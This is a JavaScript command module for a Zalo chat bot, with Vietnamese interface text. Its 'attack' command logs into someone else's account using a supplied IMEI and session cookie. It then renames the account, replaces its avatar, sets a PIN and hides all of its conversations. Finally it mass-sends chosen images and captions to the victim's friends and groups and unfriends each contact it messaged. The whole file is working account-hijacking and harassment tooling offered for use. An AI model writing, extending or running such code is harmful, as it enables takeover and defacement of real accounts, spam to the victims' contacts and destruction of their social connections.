import axios from "axios";
import fs from "fs/promises";
import path from "path";
import { randomUUID } from "crypto";
import { MessageType, Zalo } from "../../api-zalo/index.js";
import { getGlobalPrefix } from "../../service-ngh/service.js";
import { sendMessageComplete, sendMessageQuery, sendMessageWarning } from "../../service-ngh/chat-zalo/chat-style/chat-style.js";
import { deepParseJSON, removeMention } from "../../utils/format-util.js";
import { tempDir } from "../../utils/io-json.js";

const SESSION_TTL_MS = 10 * 60 * 1000;
const SEND_DELAY_MS = 1200;
const sessions = new Map();
const USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36";

function sessionKey(api, message) {
  return `${api.getBotId()}:${message.data?.uidFrom}`;
}

async function disposeSession(key) {
  const session = sessions.get(key);
  sessions.delete(key);
  if (session?.timer) clearTimeout(session.timer);
  await Promise.all((session?.attachmentPaths || []).map((filePath) => fs.unlink(filePath).catch(() => {})));
}

function normalizeFriends(response) {
  const rows = Array.isArray(response) ? response : response?.data || response?.friends || [];
  return rows.flatMap((item) => {
    const id = item?.userId || item?.uid || item?.id;
    if (!id) return [];
    return [{ id: String(id), type: MessageType.DirectMessage, kind: "Bạn bè", name: item.displayName || item.zaloName || item.name || String(id) }];
  });
}

function normalizeGroups(response) {
  const map = response?.gridInfoMap || {};
  const ids = Object.keys(response?.gridVerMap || map);
  return ids.map((id) => ({
    id: String(id),
    type: MessageType.GroupMessage,
    kind: "Nhóm",
    name: map[id]?.name || map[id]?.groupName || String(id),
  }));
}

function parseSelection(value, max) {
  const selected = new Set();
  for (const part of String(value || "").split(",")) {
    const match = part.trim().match(/^(\d+)(?:-(\d+))?$/);
    if (!match) continue;
    const start = Number(match[1]);
    const end = Number(match[2] || start);
    if (start < 1 || end < start || end > max || end - start > 200) continue;
    for (let index = start; index <= end; index += 1) selected.add(index - 1);
  }
  return [...selected];
}

async function downloadAvatar(url) {
  const parsed = new URL(url);
  if (!/^https?:$/.test(parsed.protocol)) throw new Error("Link ảnh phải dùng HTTP hoặc HTTPS");
  const response = await axios.get(parsed.toString(), {
    responseType: "arraybuffer",
    timeout: 20000,
    maxContentLength: 15 * 1024 * 1024,
    maxBodyLength: 15 * 1024 * 1024,
  });
  const contentType = String(response.headers["content-type"] || "").toLowerCase();
  if (!contentType.startsWith("image/")) throw new Error("Link không trả về tệp ảnh");
  const extension = contentType.includes("png") ? ".png" : contentType.includes("webp") ? ".webp" : ".jpg";
  const filePath = path.join(tempDir, `attack-avatar-${randomUUID()}${extension}`);
  await fs.mkdir(tempDir, { recursive: true });
  await fs.writeFile(filePath, response.data);
  return filePath;
}

async function downloadImages(value) {
  const urls = String(value || "").split(",").map((url) => url.trim()).filter(Boolean);
  if (urls.length === 0) throw new Error("Thiếu link ảnh");
  if (urls.length > 10) throw new Error("Chỉ được gửi tối đa 10 ảnh mỗi lần");
  const paths = [];
  try {
    for (const url of urls) paths.push(await downloadAvatar(url));
    return paths;
  } catch (error) {
    await Promise.all(paths.map((filePath) => fs.unlink(filePath).catch(() => {})));
    throw error;
  }
}

async function sendTargetList(api, message, targets, prefix) {
  const lines = targets.map((target, index) => `${index + 1}. [${target.kind}] ${target.name}`);
  const chunks = [];
  for (let index = 0; index < lines.length; index += 60) chunks.push(lines.slice(index, index + 60));
  const messageIds = new Set();
  for (let index = 0; index < chunks.length; index += 1) {
    const sent = await api.sendMessage(
      { msg: `${index === 0 ? `✅ Thiết lập xong. Chọn nơi gửi ảnh:\n` : ""}${chunks[index].join("\n")}${index === chunks.length - 1 ? `\n\nReply tin nhắn danh sách cuối:\n- Nhập 1,3,8 hoặc 2-5 để chọn thủ công.\n- Nhập all để thực hiện toàn bộ danh sách ở trên.\nPhiên hết hạn sau 10 phút.` : ""}` },
      message.threadId,
      MessageType.DirectMessage
    );
    [sent?.message?.msgId, sent?.message?.cliMsgId, sent?.msgId, sent?.cliMsgId]
      .filter((id) => id !== undefined && id !== null)
      .forEach((id) => messageIds.add(String(id)));
  }
  return messageIds;
}

async function startAttackSession(api, message, rawContent) {
  const prefix = getGlobalPrefix(api.getBotId());
  const commandMatch = rawContent.match(/^\S*attack\s+(.+)$/i);
  const parts = commandMatch?.[1].split("|").map((part) => part.trim()) || [];
  if (parts.length < 5) {
    await sendMessageQuery(
      api,
      message,
      `Cú pháp:\n${prefix}attack IMEI | COOKIE | LINK_ẢNH | TÊN_MỚI | PIN_4_SỐ | LỜI_NHẮN\n` +
        `Mỗi mục cách nhau bằng dấu |. Nhiều link ảnh và lời nhắn cách nhau bằng dấu phẩy; ảnh không có lời tương ứng sẽ được gửi riêng không kèm chữ.`,
      false
    );
    return;
  }

  const [imei, cookieText, imageLinks, newName, pin, ...captionParts] = parts;
  const captions = captionParts.length > 0
    ? captionParts.join(" | ").split(",").map((caption) => caption.trim())
    : [];

  if (!imei || !cookieText) throw new Error("Thiếu IMEI hoặc cookie");
  if (!/^\d{4}$/.test(pin || "")) throw new Error("Mã PIN phải gồm đúng 4 chữ số");
  if (!newName || newName.length > 40) throw new Error("Tên mới phải từ 1 đến 40 ký tự");

  const key = sessionKey(api, message);
  await disposeSession(key);
  const attachmentPaths = await downloadImages(imageLinks);
  const avatarPath = attachmentPaths[0];
  const imageCaptions = attachmentPaths.map((_, index) => captions[index] || "");

  try {
    const cookie = deepParseJSON(cookieText);
    const zalo = new Zalo(
      { imei, cookie, userAgent: USER_AGENT },
      { selfListen: false, typeLogin: 30, apiVersion: Zalo.API_VERSION, showLogs: false }
    );
    const targetApi = await zalo.login();
    const profile = (await targetApi.getProfileMe())?.profile || {};
    
    await Promise.all([
      targetApi.updateProfile({
        profile: {
          name: newName,
          dob: /^\d{4}-\d{2}-\d{2}$/.test(profile.dob || profile.sdob || "") ? (profile.dob || profile.sdob) : "2000-01-01",
          gender: Number.isInteger(Number(profile.gender)) ? Number(profile.gender) : 0,
        },
      }),
      targetApi.changeAccountAvatar(avatarPath),
      targetApi.updateHiddenConversPin(pin)
    ]);

    const [friendsResponse, groupsResponse] = await Promise.all([
      targetApi.getAllFriends(),
      targetApi.getAllGroups(),
    ]);
    const friends = normalizeFriends(friendsResponse);
    const groups = normalizeGroups(groupsResponse);

    const hiddenPromises = [];
    if (friends.length > 0) {
      for (let index = 0; index < friends.length; index += 100) {
        hiddenPromises.push(
          targetApi.setHiddenConversations(true, friends.slice(index, index + 100).map((friend) => friend.id), MessageType.DirectMessage).catch(() => {})
        );
      }
    }
    if (groups.length > 0) {
      for (let index = 0; index < groups.length; index += 100) {
        hiddenPromises.push(
          targetApi.setHiddenConversations(true, groups.slice(index, index + 100).map((group) => group.id), MessageType.GroupMessage).catch(() => {})
        );
      }
    }
    if (hiddenPromises.length > 0) {
      await Promise.all(hiddenPromises);
    }

    const targets = [...friends, ...groups];
    if (targets.length === 0) throw new Error("Tài khoản không có bạn bè hoặc nhóm nào");

    const expiresAt = Date.now() + SESSION_TTL_MS;
    sessions.set(key, { targetApi, targets, attachmentPaths, imageCaptions, expiresAt, listMessageIds: new Set(), timer: null });
    const timer = setTimeout(() => disposeSession(key), SESSION_TTL_MS);
    timer.unref?.();
    const listMessageIds = await sendTargetList(api, message, targets, prefix);
    const activeSession = sessions.get(key);
    if (activeSession) {
      activeSession.listMessageIds = listMessageIds;
      activeSession.timer = timer;
    }
  } catch (error) {
    await Promise.all(attachmentPaths.map((filePath) => fs.unlink(filePath).catch(() => {})));
    throw error;
  }
}

async function sendSelected(api, message, selectionText) {
  const key = sessionKey(api, message);
  const session = sessions.get(key);
  if (!session || session.expiresAt <= Date.now()) {
    await disposeSession(key);
    throw new Error("Phiên attack đã hết hạn, hãy nhập lại thông tin");
  }
  const normalizedSelection = String(selectionText || "").trim().toLowerCase();
  const indexes = normalizedSelection === "all"
    ? session.targets.map((_, index) => index)
    : parseSelection(normalizedSelection, session.targets.length);
  if (indexes.length === 0) throw new Error("Danh sách lựa chọn không hợp lệ");
  if (normalizedSelection !== "all" && indexes.length > 100) {
    throw new Error("Mỗi lần chọn thủ công tối đa 100 nơi nhận; dùng all để thực hiện toàn bộ danh sách");
  }

  // Một lượt `all` có thể kéo dài hơn 10 phút; không để timer phiên xóa ảnh
  // tạm trong lúc tiến trình vẫn đang gửi.
  if (session.timer) {
    clearTimeout(session.timer);
    session.timer = null;
  }

  let success = 0;
  let failed = 0;
  let unfriended = 0;
  let unfriendFailed = 0;
  
  const BATCH_SIZE = 200;
  for (let i = 0; i < indexes.length; i += BATCH_SIZE) {
    const batch = indexes.slice(i, i + BATCH_SIZE);
    await Promise.all(batch.map(async (index) => {
      const target = session.targets[index];
      try {
        const imagePromises = session.attachmentPaths.map((_, imageIndex) => {
          const baseCaption = session.imageCaptions[imageIndex];
          const personalizedCaption = target.type === MessageType.DirectMessage
            ? [baseCaption, target.name].filter(Boolean).join(" ")
            : baseCaption;
          return session.targetApi.sendMessage(
            { msg: personalizedCaption, attachments: [session.attachmentPaths[imageIndex]] },
            target.id,
            target.type
          );
        });
        await Promise.all(imagePromises);
        success += 1;
        if (target.type === MessageType.DirectMessage) {
          try {
            await session.targetApi.removeFriend(target.id);
            unfriended += 1;
          } catch (error) {
            unfriendFailed += 1;
            console.error(`Không thể xóa kết bạn với ${target.id}:`, error?.message || error);
          }
        }
      } catch {
        failed += 1;
      }
    }));
  }
  await sendMessageComplete(
    api,
    message,
    `Đã gửi ảnh tới ${success}/${indexes.length} nơi${failed ? `, lỗi ${failed}` : ""}.` +
      `\nĐã xóa kết bạn: ${unfriended}${unfriendFailed ? `, lỗi xóa ${unfriendFailed}` : ""}.`,
    false
  );
  await disposeSession(key);
}

export async function handleAttackReply(api, message) {
  if (message.type !== MessageType.DirectMessage || !message.data?.quote) return false;
  const key = sessionKey(api, message);
  const session = sessions.get(key);
  if (!session || session.expiresAt <= Date.now()) return false;

  const quote = message.data.quote;
  const quotedIds = [quote.globalMsgId, quote.msgId, quote.cliMsgId]
    .filter((id) => id !== undefined && id !== null)
    .map(String);
  if (!quotedIds.some((id) => session.listMessageIds?.has(id))) return false;

  try {
    await sendSelected(api, message, String(removeMention(message) || "").trim());
  } catch (error) {
    await sendMessageWarning(api, message, `❌ Không gửi được: ${error.message}`, false);
  }
  return true;
}

export async function handleAttackCommand(api, message) {
  if (message.type !== MessageType.DirectMessage) {
    await sendMessageWarning(api, message, "Lệnh attack chỉ được dùng trong tin nhắn riêng với bot.", false);
    return;
  }
  const rawContent = String(removeMention(message) || "").trim();
  const sendMatch = rawContent.match(/^\S*attack\s+send\s+(.+)$/i);
  try {
    if (sendMatch) await sendSelected(api, message, sendMatch[1]);
    else await startAttackSession(api, message, rawContent);
  } catch (error) {
    await sendMessageWarning(api, message, `❌ Attack thất bại: ${error.message}`, false);
  }
}
